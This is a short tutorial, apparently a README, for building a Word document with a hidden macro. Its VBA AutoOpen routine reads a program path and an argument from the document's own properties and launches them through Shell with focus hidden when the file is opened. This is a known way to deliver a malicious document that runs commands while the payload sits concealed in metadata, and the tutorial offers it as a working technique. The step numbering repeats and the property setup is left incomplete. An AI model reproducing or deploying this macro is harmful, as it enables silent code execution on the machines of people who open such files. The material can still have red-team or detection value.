# Office_Macros_With_Hidden_Functionalities

## Create Document Template
1. Create a new word document. 
![Create New Document](images/1.png)

2. Select `View`, `Macros`, `View Macros`.
![View Macros](images/2.png)

3. Enter a name for the macro in the `Macro name:` field and select `Create`. 
![Create Macro](images/3.png)

4. Copy & Paste the code below into the codebox and click on the `Save` icon.
![Create Macro](images/4.png)
```vb
Sub AutoOpen()
    chapel
End Sub
Sub chapel()
    Dim strProgramName As String
    Dim strArgument As String
    Set doc = ActiveDocument
    strProgramName = doc.BuiltInDocumentProperties("cmd").Value
    strArgument = doc.BuiltInDocumentProperties("argument").Value
    Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub

```
5. Create Custom properties. Go to `File`, `Info`, `Properties`, `Advanced Properties`.
![Create Macro](images/5.png)

5. Save the document as type docx. In this example it is saved to `C:\temp\` location. 

